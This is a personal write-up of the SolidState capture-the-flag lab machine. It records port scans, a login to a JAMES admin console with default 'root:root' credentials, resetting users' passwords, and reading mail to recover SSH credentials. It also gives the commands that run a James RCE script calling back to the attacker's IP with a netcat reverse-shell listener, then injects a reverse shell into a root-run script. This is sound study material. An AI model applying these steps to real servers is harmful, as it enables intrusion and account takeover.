202210031126
Status: #idea
Tags: [[Labs]]

# SolidState
ip: 10.10.10.51

## Recon

Ports Open:

```
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip
```

Full Nmap Scan:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.4 [10.10.14.4])
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp  open  pop3    JAMES pop3d 2.3.2
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
119/tcp  open  nntp    JAMES nntpd (posting ok)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4555/tcp open  rsip?
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
```

Port 80:

- Apache 2.4.25
- Possible Domain Name: solid-state-security.com
- Possible user/email: webadmin@solid-state-security.com
- Directoring Listing:
```
/images
/assets
/README.txt
/LICENSE.txt
/server-status
```

Port 4555:

- JAMES Remote Administration Tool 2.3.2
- `telnet 10.10.10.51 4555`
- Correct Username and Password Guess: `root:root`
- Exploit: [[James Server RCE]]
```
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```
- We set the password to all users as `password`

Port 110:

- Read emails via POP:
```
telnet 10.10.10.51 110
USER mindy
PASS password
LIST
+OK 2 1945
1 1109
2 836
RETR 2
<shows email that contains credentials>
```
- ssh credentials found: `mindy:P@55W0rd1!2@`

Port 22:

- ssh with credentials found
- Does not return a good shell
- Combining the exploit found with the login attempt will give us a usable shell



# Exploit

- Exploit: [[James Server RCE]]

```
1. python3 jamesrce.py 10.10.10.51 10.10.14.4 1234
2. nc -nvlp 1234
3. ssh mindy@10.10.10.51
4. ssh shell is broken, but we receive good shell on nc due to exploit
``` 
![[jamesrce.png]]

## Post Exploitation

- Found a `tmp.py` script in the opt directory
- Using pspy32, we see that the script is being executed over time
- We have write access to the script
- We inject reverse shell code into the script and wait for the magic
- Easy root










---
# References
- [[James Server RCE]]

